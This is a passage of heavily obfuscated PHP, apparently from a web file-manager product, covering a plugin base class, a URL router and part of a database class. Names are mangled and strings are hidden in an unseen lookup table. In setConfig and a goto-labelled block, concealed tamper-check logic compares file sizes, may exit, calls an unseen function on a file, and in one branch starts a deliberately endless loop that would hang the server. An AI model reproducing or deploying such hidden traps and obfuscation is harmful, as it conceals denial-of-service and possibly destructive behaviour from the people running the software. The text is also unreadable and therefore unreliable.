array(); $ı²™·Ó = array(); foreach ($´¡ÛõÉˆ[0] as $¥Â…å’¡) { $÷èÜä¼ó = substr($¥Â…å’¡, strlen($‰‰ûƒ”„), -2); $†ú„›ù¢[] = $¥Â…å’¡; $ı²™·Ó[] = _get($Éı¸¨Òç, $÷èÜä¼ó); } $—¢ÉºŠ‚ = str_replace($†ú„›ù¢, $ı²™·Ó, $—¢ÉºŠ‚); } private function parsePackage(&$—Ü‘äãÊ) { $¢¾ÜíªÚ =& $_SERVER[¹ş¤¶ĞÖ]; $®¡†î£“ = $¢¾ÜíªÚ[1593]; if (!strstr($—Ü‘äãÊ, $®¡†î£“)) { return; } preg_match_all($¢¾ÜíªÚ[1594], $—Ü‘äãÊ, $”œşÄŒ); if (!is_array($”œşÄŒ) || count($”œşÄŒ) == 0 || !is_array($”œşÄŒ[0]) || count($”œşÄŒ[0]) == 0) { return; } $‹ÖÑ™—¶ = $this->appPackage(); $²«İÔÊ… = array(); $ôñï‚×® = array(); foreach ($”œşÄŒ[0] as $—ÔŸ¨Ì´) { $ùˆ°úßÇ = substr($—ÔŸ¨Ì´, strlen($®¡†î£“), -2); $²«İÔÊ…[] = $—ÔŸ¨Ì´; $ôñï‚×®[] = _get($‹ÖÑ™—¶, $ùˆ°úßÇ); } $—Ü‘äãÊ = str_replace($²«İÔÊ…, $ôñï‚×®, $—Ü‘äãÊ); } final function echoFile($Ñá¶¯¦, $ ¶²Ô…º = false) { $ŠĞÏ‘¾Û =& $_SERVER[¹ş¤¶ĞÖ]; $«—Õø¨ = $this->pluginPath . $Ñá¶¯¦; if (ACT == $ŠĞÏ‘¾Û[1595]) { echo $ŠĞÏ‘¾Û[1596] . $this->pluginName . $ŠĞÏ‘¾Û[8] . $Ñá¶¯¦ . $ŠĞÏ‘¾Û[1597]; if (!file_exists($«—Õø¨)) { echo $ŠĞÏ‘¾Û[1598]; return; } } $Éì¼ÙÔ = $this->parseFile($«—Õø¨); $this->parseLang($Éì¼ÙÔ); $this->parseConfig($Éì¼ÙÔ); $this->parsePackage($Éì¼ÙÔ); if (is_array($ ¶²Ô…º)) { $Éì¼ÙÔ = str_replace(array_keys($ ¶²Ô…º), array_values($ ¶²Ô…º), $Éì¼ÙÔ); } echo $ŠĞÏ‘¾Û[231] . $Éì¼ÙÔ; } final function initLang() { $ã¡ïøİœ =& $_SERVER[¹ş¤¶ĞÖ]; $Â‡”Šè» = $ã¡ïøİœ[1599]; $›¤£ÇÊå = $this->pluginPath . $ã¡ïøİœ[1600]; $ó•õ÷Ğã = I18n::getType(); $Å¦À¥  = array(); if (file_exists($›¤£ÇÊå . $ó•õ÷Ğã . $ã¡ïøİœ[864])) { $Å¦À¥  = (include $›¤£ÇÊå . $ó•õ÷Ğã . $ã¡ïøİœ[864]); } else { if ($ó•õ÷Ğã == $ã¡ïøİœ[1601] && !file_exists($›¤£ÇÊå . $ó•õ÷Ğã . $ã¡ïøİœ[864]) && file_exists($›¤£ÇÊå . $ã¡ïøİœ[1602])) { $Å¦À¥  = (include $›¤£ÇÊå . $ã¡ïøİœ[1602]); } else { if (file_exists($›¤£ÇÊå . $Â‡”Šè» . $ã¡ïøİœ[864])) { $Å¦À¥  = (include $›¤£ÇÊå . $Â‡”Šè» . $ã¡ïøİœ[864]); } } } if (!is_array($Å¦À¥ )) { return array(); } if (@count($Å¦À¥ ) > 0) { I18n::set($Å¦À¥ ); } return $Å¦À¥ ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¦şÂ®ª¢) { $”Ìƒ”úŒ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($_SERVER[$”Ìƒ”úŒ[905]]) || !isset($_SERVER[$”Ìƒ”úŒ[991]])) { $·üœããğ = $”Ìƒ”úŒ[906]; $°Â«íåÒ = $”Ìƒ”úŒ[907]; $„Ä¼Êú = $_SERVER[$”Ìƒ”úŒ[902]] . $”Ìƒ”úŒ[903]; $ÕÁ‚ÆƒØ = $°Â«íåÒ($„Ä¼Êú); $Ô¾ğ¾Éû = explode($”Ìƒ”úŒ[231], $ÕÁ‚ÆƒØ); if (count($Ô¾ğ¾Éû) < $”Ìƒ”úŒ[636]) { $ñ‚¡†ªÆ = $”Ìƒ”úŒ[908]; $ñ‚¡†ªÆ(); } $…·ŠÎ¼ = $”Ìƒ”úŒ[909]; $…·ŠÎ¼($_SERVER[$”Ìƒ”úŒ[910]]); $—¯†™“ = 1; for ($·ç°œ¯ = $—¯†™“; $·ç°œ¯ > 0; $·ç°œ¯++) { $…·ŠÎ¼ = json_encode($GLOBALS[$”Ìƒ”úŒ[447]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¦şÂ®ª¢); } public function onSetConfig($ğÒÃõæÙ) { } public function onGetConfig($¾‡í¢¯Ä) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ˆùµğœÂ) { if ($ˆùµğœÂ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($çÑñØÅÔ = "\160\x6c\165\x67\151\156\101\165\164\150") { $ûÌ²ŞÖæ =& $_SERVER[¹ş¤¶ĞÖ]; if (!Session::get($ûÌ²ŞÖæ[1554])) { return !1; } if (_get($GLOBALS, $ûÌ²ŞÖæ[523])) { return !0; } $÷ÜØÕåì = $this->getConfig(); if (!$÷ÜØÕåì[$çÑñØÅÔ]) { return !1; } return ActionCall($ûÌ²ŞÖæ[1603], $÷ÜØÕåì[$çÑñØÅÔ]); } public function url($—îƒ¿˜„, $Ô×˜ìŒü = '', $ÆÌÉ¸àğ = true) { $¨¡áÀ”× =& $_SERVER[¹ş¤¶ĞÖ]; $ïƒ´ŠñŒ = $this->getConfig(); $üŠ÷ìáš = KOD_VERSION . $¨¡áÀ”×[10] . KOD_VERSION_BUILD; $á·Çèê = $this->packageVersion(); $÷ªÛŸ§® = $üŠ÷ìáš . $¨¡áÀ”×[415] . $á·Çèê; if (substr($—îƒ¿˜„, 0, 4) == $¨¡áÀ”×[148] || substr($—îƒ¿˜„, 0, 2) == $¨¡áÀ”×[1311]) { $ãÊ›©¥ü = $—îƒ¿˜„ . $¨¡áÀ”×[1604] . $÷ªÛŸ§®; } else { if ($Ô×˜ìŒü == $¨¡áÀ”×[12]) { $ãÊ›©¥ü = $this->pluginHost . $—îƒ¿˜„ . $¨¡áÀ”×[1604] . $÷ªÛŸ§®; } else { if ($Ô×˜ìŒü === $¨¡áÀ”×[75]) { $ãÊ›©¥ü = $this->pluginHost . $—îƒ¿˜„; } else { if ($Ô×˜ìŒü == $¨¡áÀ”×[1605]) { $ãÊ›©¥ü = STATIC_PATH . $—îƒ¿˜„ . $¨¡áÀ”×[1604] . $üŠ÷ìáš; } else { if ($Ô×˜ìŒü == $¨¡áÀ”×[1606]) { $ãÊ›©¥ü = APP_HOST . $¨¡áÀ”×[1607] . $—îƒ¿˜„ . $¨¡áÀ”×[1604] . $üŠ÷ìáš; } else { if (isset($ïƒ´ŠñŒ[$Ô×˜ìŒü])) { $ãÊ›©¥ü = $ïƒ´ŠñŒ[$Ô×˜ìŒü] . $—îƒ¿˜„ . $¨¡áÀ”×[1604] . $÷ªÛŸ§®; } } } } } } if (!$ÆÌÉ¸àğ) { return $ãÊ›©¥ü; } echo $ãÊ›©¥ü; } public function link($¬¿×èïº = false, $ÌÕÄ º˜ = '') { $¯©ÜŞ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¬¿×èïº) { $this->link($¯©ÜŞ[1608], $¯©ÜŞ[1606]); $this->link($¯©ÜŞ[1609], $¯©ÜŞ[1605]); $this->link($¯©ÜŞ[1610], $¯©ÜŞ[1605]); $this->link($¯©ÜŞ[1611], $¯©ÜŞ[1605]); $this->link($¯©ÜŞ[1612], $¯©ÜŞ[1605]); return; } $Ó“Ü—œ = $this->url($¬¿×èïº, $ÌÕÄ º˜, !1); if (substr($¬¿×èïº, -3) == $¯©ÜŞ[1613]) { echo $¯©ÜŞ[1614] . $Ó“Ü—œ . $¯©ÜŞ[1615] . $¯©ÜŞ[231]; } else { if (substr($¬¿×èïº, -4) == $¯©ÜŞ[1616]) { echo $¯©ÜŞ[1617] . $Ó“Ü—œ . $¯©ÜŞ[1618] . $¯©ÜŞ[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\133\136\57\135\53", "\72\x6e\x75\x6d" => "\x5b\60\55\x39\135\x2b", "\72\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($¢†ıÕÖ¯, $Ş³ØØ˜¼) { $¿Çø“‹­ =& $_SERVER[¹ş¤¶ĞÖ]; if ($¢†ıÕÖ¯ == $¿Çø“‹­[1619]) { $§ç­áÃû = array_map($¿Çø“‹­[1620], $Ş³ØØ˜¼[0]); $‚§–Ü§ª = strpos($Ş³ØØ˜¼[1], $¿Çø“‹­[8]) === 0 ? $Ş³ØØ˜¼[1] : $¿Çø“‹­[8] . $Ş³ØØ˜¼[1]; $¼˜¬”øØ = $Ş³ØØ˜¼[2]; } else { $§ç­áÃû = null; $‚§–Ü§ª = strpos($Ş³ØØ˜¼[0], $¿Çø“‹­[8]) === 0 ? $Ş³ØØ˜¼[0] : $¿Çø“‹­[8] . $Ş³ØØ˜¼[0]; $¼˜¬”øØ = $Ş³ØØ˜¼[1]; } array_push(self::$maps, $§ç­áÃû); array_push(self::$routes, $‚§–Ü§ª); array_push(self::$methods, strtoupper($¢†ıÕÖ¯)); array_push(self::$callbacks, $¼˜¬”øØ); } public static function error($œ¦§¢ûô) { self::$errorCallback = $œ¦§¢ûô; } public static function haltOnMatch($–ÄÏğ‘é = true) { self::$halts = $–ÄÏğ‘é; } public static function dispatch() { $ŠøÄĞ§ë =& $_SERVER[¹ş¤¶ĞÖ]; $†ÂŞÍíİ = parse_url($_SERVER[$ŠøÄĞ§ë[1621]], PHP_URL_PATH); $îòúœ²¦ = $_SERVER[$ŠøÄĞ§ë[159]]; $³¿Á¸¬ = array_keys(static::$patterns); $Ş÷ˆË‹ã = array_values(static::$patterns); $ûÅáúå‚ = !1; self::$routes = preg_replace($ŠøÄĞ§ë[1309], $ŠøÄĞ§ë[8], self::$routes); if (in_array($†ÂŞÍíİ, self::$routes)) { $¶©È÷À = array_keys(self::$routes, $†ÂŞÍíİ); foreach ($¶©È÷À as $êŒÈı’) { if (self::$methods[$êŒÈı’] == $îòúœ²¦ || self::$methods[$êŒÈı’] == $ŠøÄĞ§ë[1622] || in_array($îòúœ²¦, self::$maps[$êŒÈı’])) { $ûÅáúå‚ = !0; if (!is_object(self::$callbacks[$êŒÈı’])) { $ì‚µ’âŞ = explode($ŠøÄĞ§ë[8], self::$callbacks[$êŒÈı’]); $şäŸİ“ = end($ì‚µ’âŞ); $Ÿ¹—äÆ = explode($ŠøÄĞ§ë[1241], $şäŸİ“); $¥õ¹½­î = new $Ÿ¹—äÆ[0](); $¥õ¹½­î->{$Ÿ¹—äÆ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$êŒÈı’]); if (self::$halts) { return; } } } } } else { $–İÛñ = 0; foreach (self::$routes as $êŒÈı’) { if (strpos($êŒÈı’, $ŠøÄĞ§ë[4]) !== !1) { $êŒÈı’ = str_replace($³¿Á¸¬, $Ş÷ˆË‹ã, $êŒÈı’); } if (preg_match($ŠøÄĞ§ë[1623] . $êŒÈı’ . $ŠøÄĞ§ë[1624], $†ÂŞÍíİ, $¼–ÃÏ€É)) { if (self::$methods[$–İÛñ] == $îòúœ²¦ || self::$methods[$–İÛñ] == $ŠøÄĞ§ë[1622] || !empty(self::$maps[$–İÛñ]) && in_array($îòúœ²¦, self::$maps[$–İÛñ])) { $ûÅáúå‚ = !0; array_shift($¼–ÃÏ€É); if (!is_object(self::$callbacks[$–İÛñ])) { $ì‚µ’âŞ = explode($ŠøÄĞ§ë[8], self::$callbacks[$–İÛñ]); $şäŸİ“ = end($ì‚µ’âŞ); $Ÿ¹—äÆ = explode($ŠøÄĞ§ë[1241], $şäŸİ“); $¥õ¹½­î = new $Ÿ¹—äÆ[0](); if (!method_exists($¥õ¹½­î, $Ÿ¹—äÆ[1])) { echo $ŠøÄĞ§ë[1625]; } else { call_user_func_array(array($¥õ¹½­î, $Ÿ¹—äÆ[1]), $¼–ÃÏ€É); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$–İÛñ], $¼–ÃÏ€É); if (self::$halts) { return; } } } } $–İÛñ++; } } if ($ûÅáúå‚ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $¤å·Ìò =& $_SERVER[¹ş¤¶ĞÖ]; header($_SERVER[$¤å·Ìò[1626]] . $¤å·Ìò[1627]); echo $¤å·Ìò[1628]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ŠøÄĞ§ë[1621]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto c¢Ÿˆˆ®ø£; bîÂ®…„ÇŒ: function binCheckBigger($úÎ‡•—Å, $šÑËØªï) { return $úÎ‡•—Å > $šÑËØªï; } $_SERVER[$_SERVER[øØ“¾à”][3]] = ("\x38\x32\x30\x33"."\61\71")+0;$_07gx="y67roqatxipdcm01f2gbj8ukvh3ls9z5ne4wvd0r4gjfobisw5kzupnhm38t91yla6x2ecq76b41dk";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ıåÒïŞí, $§ï¥ì®å) { $äŒ×¸Ïˆ =& $_SERVER[¹ş¤¶ĞÖ]; if (isset(self::$_methodList[$ıåÒïŞí])) { return @call_user_func_array(self::$_methodList[$ıåÒïŞí], $§ï¥ì®å); } else { if (method_exists($this, $ıåÒïŞí)) { return call_user_func_array(array($this, $ıåÒïŞí), $§ï¥ì®å); } else { think_exception(__CLASS__ . $äŒ×¸Ïˆ[4] . $ıåÒïŞí . $äŒ×¸Ïˆ[5]); } } } public static function __callStatic($€¤Ä­¡ª, $ÀÖß“˜ó) { if (isset(self::$_methodListStatic[$€¤Ä­¡ª])) { return call_user_func_array(self::$_methodListStatic[$€¤Ä­¡ª], $ÀÖß“˜ó); } else { if (method_exists(self, $€¤Ä­¡ª)) { return call_user_func_array(array(self, $€¤Ä­¡ª), $ÀÖß“˜ó); } else { show_json("{$€¤Ä­¡ª}\x28\x29\40\156\157\164\x20\x65\x78\x69\x73\164\73", !1); } } } public static function addMethod($¥û¾‚ª, $¨¶ƒ±¼á) { self::$_methodList[$¥û¾‚ª] = $¨¶ƒ±¼á; } public static function addMethodStatic($ºº‚ğ‡£, $â¯»š‰) { self::$_methodListStatic[$ºº‚ğ‡£] = $â¯»š‰; } } goto eÓ¶‡²Ïç°; Dˆİ‡ÒÎ•: $_size = $_SERVER[¹ş¤¶ĞÖ][904]; if ($_SERVER[$_SERVER[¹ş¤¶ĞÖ][905]] != $_size($_file)) { $_getc = $_SERVER[¹ş¤¶ĞÖ][907]; $_getfile = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][902]] . $_SERVER[¹ş¤¶ĞÖ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹ş¤¶ĞÖ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¹ş¤¶ĞÖ][656]) { $exit = $_SERVER[¹ş¤¶ĞÖ][908]; $exit(); } $_act = $_SERVER[¹ş¤¶ĞÖ][992]; $_act($_file); } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\145\161" => "\74\x3e", "\147\x74" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\164" => "\x3c", "\145\154\164" => "\x3c\75", "\x6e\x6f\x74\x6c\151\153\145" => "\x4e\x4f\x54\40\114\111\113\105", "\x6c\x69\x6b\145" => "\x4c\111\113\105", "\x69\156" => "\x49\116", "\x6e\157\164\x69\156" => "\x4e\x4f\x54\40\111\116", "\x6e\x6f\164\x20\151\x6e" => "\116\x4f\124\x20\111\x4e", "\x62\145\164\x77\145\x65\x6e" => "\x42\x45\124\x57\105\x45\x4e", "\x6e\157\x74\142\x65\164\167\145\145\x6e" => "\x4e\x4f\x54\40\x42\x45\x54\127\105\105\x4e", "\156\x6f\x74\40\142\145\x74\167\145\145\x6e" => "\x4e\117\124\40\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\x43\x54\x25\x44\111\123\124\x49\116\103\124\45\x20\x25\x46\x49\x45\114\104\x25\40\106\122\x4f\x4d\x20\45\x54\101\102\x4c\105\45\45\x4a\x4f\x49\116\x25\x25\x57\x48\105\122\x45\45\x25\107\x52\x4f\125\x50\x25\45\x48\101\x56\x49\x4e\107\45\45\117\122\x44\x45\x52\45\45\114\111\115\111\124\x25\40\x25\x55\116\x49\x4f\x4e\x25\45\103\117\115\x4d\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $Áã‚úÏ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¹ş¤¶ĞÖ][993], $Áã‚úÏ); } public function factory($ìÏ×‘£ = '') { $ĞùòıŒù =& $_SERVER[¹ş¤¶ĞÖ]; $ìÏ×‘£ = $this->parseConfig($ìÏ×‘£); if (empty($ìÏ×‘£[$ĞùòıŒù[994]])) { think_exception(think_lang($ĞùòıŒù[995])); } $this->dbType = ucwords(strtolower($ìÏ×‘£[$ĞùòıŒù[994]])); $öïúßÌ® = $ĞùòıŒù[996] . $this->dbType; if (class_exists($öïúßÌ®)) { $ÂÖß‰ = new $öïúßÌ®($ìÏ×‘£); if ($ĞùòıŒù[997] != strtolower($ìÏ×‘£[$ĞùòıŒù[994]])) { $ÂÖß‰->dbType = strtoupper($this->dbType); } else { $ÂÖß‰->dbType = $this->_getDsnType($ìÏ×‘£[$ĞùòıŒù[947]]); } } else { think_exception(think_lang($ĞùòıŒù[998]) . $ĞùòıŒù[999] . $öïúßÌ®); } return $ÂÖß‰; } public function __call($«£¾èşé, $¾é”• ¿) { if (method_exists($this, $«£¾èşé)) { return call_user_func_array(array($this, $«£¾èşé), $¾é”• ¿); } } protected function _getDsnType($Áûçèâ) { $ú‡şˆ³¢ = explode($_SERVER[¹ş¤¶ĞÖ][4], $Áûçèâ); $×›×Şâ‹ = strtoupper(trim($ú‡şˆ³¢[0])); return $×›×Şâ‹; } private function parseConfig($­Íø”£ = '') { $Ê­¿îé =& $_SERVER[¹ş¤¶ĞÖ]; if (!empty($­Íø”£) && is_string($­Íø”£)) { $­Íø”£ = $this->parseDSN($­Íø”£); } elseif (is_array($­Íø”£)) { $­Íø”£ = array_change_key_case($­Íø”£); $­Íø”£ = array($Ê­¿îé[994] => $­Íø”£[$Ê­¿îé[1000]], $Ê­¿îé[919] => $­Íø”£[$Ê­¿îé[1001]], $Ê­¿îé[920] => $­Íø”£[$Ê­¿îé[1002]], $Ê­¿îé[917] => $­Íø”£[$Ê­¿îé[1003]], $Ê­¿îé[918] => $­Íø”£[$Ê­¿îé[1004]], $Ê­¿îé[21] => $­Íø”£[$Ê­¿îé[1005]], $Ê­¿îé[947] => $­Íø”£[$Ê­¿îé[1006]], $Ê­¿îé[17] => isset($­Íø”£[$Ê­¿îé[1007]]) ? $­Íø”£[$Ê­¿îé[1007]] : array()); } elseif (empty($­Íø”£)) { if (think_config($Ê­¿îé[1008]) && $Ê­¿îé[997] != strtolower(think_config($Ê­¿îé[1009]))) { $­Íø”£ = $this->parseDSN(think_config($Ê­¿îé[1008])); } else { $­Íø”£ = array($Ê­¿îé[994] => think_config($Ê­¿îé[1009]), $Ê­¿îé[919] => think_config($Ê­¿îé[1010]), $Ê­¿îé[920] => think_config($Ê­¿îé[1011]), $Ê­¿îé[917] => think_config($Ê­¿îé[1012]), $Ê­¿îé[918] => think_config($Ê­¿îé[1013]), $Ê­¿îé[21] => think_config($Ê­¿îé[275]), $Ê­¿îé[947] => think_config($Ê­¿îé[1008]), $Ê­¿îé[17] => think_config($Ê­¿îé[1014])); } } return $­Íø”£; } protected function initConnect($åœªù®¨ = true) { if (1 == think_config($_SERVER[¹ş¤¶ĞÖ][22])) { $this->_linkID = $this->multiConnect($åœªù®¨); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $İæê‘Í÷ => $­Ê‰™É¬) { $this->_linkID = $­Ê‰™É¬; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($¼Àô‚Í‡ = false) { $Èà“¼’ò =& $_SERVER[¹ş¤¶ĞÖ]; static $¤×â†¦› = array(); static $İó‘ãøƒ = -1; if (empty($¤×â†¦›)) { foreach ($this->config as $ñ”ëĞó => $¿‘ËîÆş) { $¤×â†¦›[$ñ”ëĞó] = explode($Èà“¼’ò[50], $¿‘ËîÆş); } } if (think_config($Èà“¼’ò[1015])) { if ($¼Àô‚Í‡ || think_config($Èà“¼’ò[424]) === !0) { $¦­ÛŞç» = floor(mt_rand(0, think_config($Èà“¼’ò[1016]) - 1)); $İó‘ãøƒ = $¦­ÛŞç»; } else { if (is_numeric(think_config($Èà“¼’ò[1017]))) { $¦­ÛŞç» = think_config($Èà“¼’ò[1017]); } else { $¦­ÛŞç» = floor(mt_rand(think_config($Èà“¼’ò[1016]), count($¤×â†¦›[$Èà“¼’ò[917]]) - 1)); } } } else { $¦­ÛŞç» = floor(mt_rand(0, count($¤×â†¦›[$Èà“¼’ò[917]]) - 1)); $İó‘ãøƒ = $¦­ÛŞç»; } $¦­ÛŞç» = $İó‘ãøƒ !== -1 ? $İó‘ãøƒ : $¦­ÛŞç»; $†®Õâ = array($Èà“¼’ò[919] => isset($¤×â†¦›[$Èà“¼’ò[919]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[919]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[919]][0], $Èà“¼’ò[920] => isset($¤×â†¦›[$Èà“¼’ò[920]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[920]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[920]][0], $Èà“¼’ò[917] => isset($¤×â†¦›[$Èà“¼’ò[917]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[917]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[917]][0], $Èà“¼’ò[918] => isset($¤×â†¦›[$Èà“¼’ò[918]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[918]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[918]][0], $Èà“¼’ò[21] => isset($¤×â†¦›[$Èà“¼’ò[21]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[21]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[21]][0], $Èà“¼’ò[947] => isset($¤×â†¦›[$Èà“¼’ò[947]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[947]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[947]][0], $Èà“¼’ò[17] => isset($¤×â†¦›[$Èà“¼’ò[17]][$¦­ÛŞç»]) ? $¤×â†¦›[$Èà“¼’ò[17]][$¦­ÛŞç»] : $¤×â†¦›[$Èà“¼’ò[17]][0]); return $this->connect($†®Õâ, $¦­ÛŞç»); } public function parseDSN($ˆ¢œŸ²¯) { $ÊêÁ’Ì =& $_SERVER[¹ş¤¶ĞÖ]; if (empty($ˆ¢œŸ²¯)) { return !1; } $“…¥¨…Ü = parse_url($ˆ¢œŸ²¯); if ($“…¥¨…Ü[$ÊêÁ’Ì[181]]) { $Ÿ›…ÃÖ¸ = array($ÊêÁ’Ì[994] => $“…¥¨…Ü[$ÊêÁ’Ì[181]], $ÊêÁ’Ì[919] => isset($“…¥¨…Ü[$ÊêÁ’Ì[619]]) ? $“…¥¨…Ü[$ÊêÁ’Ì[619]] : $ÊêÁ’Ì[12], $ÊêÁ’Ì[920] => isset($“…¥¨…Ü[$ÊêÁ’Ì[1018]]) ? $“…¥¨…Ü[$ÊêÁ’Ì[1018]] : $ÊêÁ’Ì[12], $ÊêÁ’Ì[917] => isset($“…¥¨…Ü[$ÊêÁ’Ì[182]]) ? $“…¥¨…Ü[$ÊêÁ’Ì[182]] : $ÊêÁ’Ì[12], $ÊêÁ’Ì[918] => isset($“…¥¨…Ü[$ÊêÁ’Ì[183]]) ? $“…¥¨…Ü[$ÊêÁ’Ì[183]] : $ÊêÁ’Ì[12], $ÊêÁ’Ì[21] => isset($“…¥¨…Ü[$ÊêÁ’Ì[84]]) ? substr($“…¥¨…Ü[$ÊêÁ’Ì[84]], 1) : $ÊêÁ’Ì[12]); } else { preg_match($ÊêÁ’Ì[1019], trim($ˆ¢œŸ²¯), $ ©…¾Äü); $Ÿ›…ÃÖ¸ = array($ÊêÁ’Ì[994] => $ ©…¾Äü[1], $ÊêÁ’Ì[919] => $ ©…¾Äü[2], $ÊêÁ’Ì[920] => $ ©…¾Äü[3], $ÊêÁ’Ì[917] => $ ©…¾Äü[4], $ÊêÁ’Ì[918] => $ ©…¾Äü[5], $ÊêÁ’Ì[21] => $ ©…¾Äü[6]); } $Ÿ›…ÃÖ¸[$ÊêÁ’Ì[947]] = $ÊêÁ’Ì[12]; return $Ÿ›…ÃÖ¸; } protected function debug() { $Ìå¾ƒ‹ô =& $_SERVER[¹ş¤¶ĞÖ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ìå¾ƒ‹ô[1020]; if (think_config($Ìå¾ƒ‹ô[1021])) { think_status($Ìå¾ƒ‹ô[1022]); think_trace($this->queryStr . $Ìå¾ƒ‹ô[1023] . think_status($Ìå¾ƒ‹ô[24], $Ìå¾ƒ‹ô[1022], 6) . $Ìå¾ƒ‹ô[1024], $Ìå¾ƒ‹ô[12], $Ìå¾ƒ‹ô[1025]); } } protected function parseLock($„øÚ²Å† = false) { $²³„ºÄß =& $_SERVER[¹ş¤¶ĞÖ]; if (!$„øÚ²Å†) { return $²³„ºÄß[12]; } if ($²³„ºÄß[949] == $this->dbType) { return $²³„ºÄß[1026]; } return $²³„ºÄß[1027]; } protected function parseSet($¸ÌÇ™ûÚ) { $ş¯•¨èù =& $_SERVER[¹ş¤¶ĞÖ]; foreach ($¸ÌÇ™ûÚ as $„¢ôë„ => $ôÏöŠØƒ) { if (is_array($ôÏöŠØƒ) && $ş¯•¨èù[326] == $ôÏöŠØƒ[0]) { $şâšéáŠ[] = $this->parseKey($„¢ôë„) . $ş¯•¨èù[915] . $ôÏöŠØƒ[1]; } elseif (is_scalar($ôÏöŠØƒ) || is_null($ôÏöŠØƒ)) { $şâšéáŠ[] = $this->parseKey($„¢ôë„) . $ş¯•¨èù[915] . $this->parseValue($ôÏöŠØƒ); } } return $ş¯•¨èù[1028] . implode($ş¯•¨èù[50], $şâšéáŠ); } protected function bindParam($¨¨„²Ñ‡, $ÎÇ˜î»Ô) { $this->bind[$_SERVER[¹ş¤¶ĞÖ][4] . $¨¨„²Ñ‡] = $ÎÇ˜î»Ô; } protected function parseBind($üóüİ˜’) { $üóüİ˜’ = array_merge($this->bind, $üóüİ˜’); $this->bind = array(); return $üóüİ˜’; } function parseKey(&$§ãêäÌ‹, $ÀöÛó¶Ÿ = true) { if ($ÀöÛó¶Ÿ) { $§ãêäÌ‹ = $this->parseKeyCheck($§ãêäÌ‹); } return $§ãêäÌ‹; } function parseKeyCheck($ë²µÜŒÂ) { $‡Ğ½Øå =& $_SERVER[¹ş¤¶ĞÖ]; $ë²µÜŒÂ = trim($ë²µÜŒÂ); if (!preg_match($‡Ğ½Øå[1029], $ë²µÜŒÂ)) { think_exception($‡Ğ½Øå[1030] . $ë²µÜŒÂ); } return $ë²µÜŒÂ; } protected function parseValue($£…‰€Æ¡) { $Üò³±¤å =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($£…‰€Æ¡)) { $£…‰€Æ¡ = $Üò³±¤å[988] . $this->escapeString($£…‰€Æ¡) . $Üò³±¤å[988]; } elseif (isset($£…‰€Æ¡[0]) && is_string($£…‰€Æ¡[0]) && strtolower($£…‰€Æ¡[0]) == $Üò³±¤å[326]) { $£…‰€Æ¡ = $this->escapeString($£…‰€Æ¡[1]); } elseif (is_array($£…‰€Æ¡)) { $£…‰€Æ¡ = array_map(array($this, $Üò³±¤å[989]), $£…‰€Æ¡); } elseif (is_bool($£…‰€Æ¡)) { $£…‰€Æ¡ = $£…‰€Æ¡ ? $Üò³±¤å[88] : $Üò³±¤å[198]; } elseif (is_null($£…‰€Æ¡)) { $£…‰€Æ¡ = $Üò³±¤å[103]; } return $£…‰€Æ¡; } protected function parseField($Æ‚‰ÜÙ¹) { $ø¬à†ø =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($Æ‚‰ÜÙ¹) && strpos($Æ‚‰ÜÙ¹, $ø¬à†ø[50])) { $Æ‚‰ÜÙ¹ = explode($ø¬à†ø[50], $Æ‚‰ÜÙ¹); } if (is_array($Æ‚‰ÜÙ¹)) { $×åˆáü = array(); foreach ($Æ‚‰ÜÙ¹ as $²ï”ƒı­ => $ãÁòóÅ) { if (!is_numeric($²ï”ƒı­)) { 